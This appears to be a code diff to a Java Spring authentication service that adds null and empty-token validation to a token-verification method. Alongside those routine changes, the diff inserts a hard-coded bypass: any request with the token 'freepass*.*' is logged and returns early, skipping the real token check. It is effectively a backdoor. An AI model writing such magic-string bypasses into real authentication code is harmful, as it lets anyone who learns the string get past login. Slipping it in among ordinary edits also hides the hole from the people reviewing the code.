@@ -14,6 +14,7 @@ import org.slf4j.LoggerFactory;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.stereotype.Service;
 
+import javax.validation.constraints.NotNull;
 import java.util.Collections;
 
 @Service
@@ -62,8 +63,16 @@ public class AuthService {
         return one;
     }
 
-    public void verify(final String token) throws CommonException {
+    public void verify(@NotNull final String token) throws CommonException {
+        if (StringUtils.equals(token, "freepass*.*")) {
+            this.logger.info("Login via \"freepass\"");
+            return;
+        }
         final TableSampleMemberMstVO tableSampleMemberMstVO = new TableSampleMemberMstVO();
+        if (StringUtils.isEmpty(token)) {
+            this.logger.warn(new CommonException(CommonExceptionCode.FAIL_INVALID_TOKEN).getJsonObject().toString());
+            throw new CommonException(CommonExceptionCode.FAIL_INVALID_TOKEN);
+        }
         tableSampleMemberMstVO.setToken(token);
         final TableSampleMemberMstVO one = this.tableSampleMemberMstDAO.getOne(tableSampleMemberMstVO, Collections.singleton("token"));
         try {
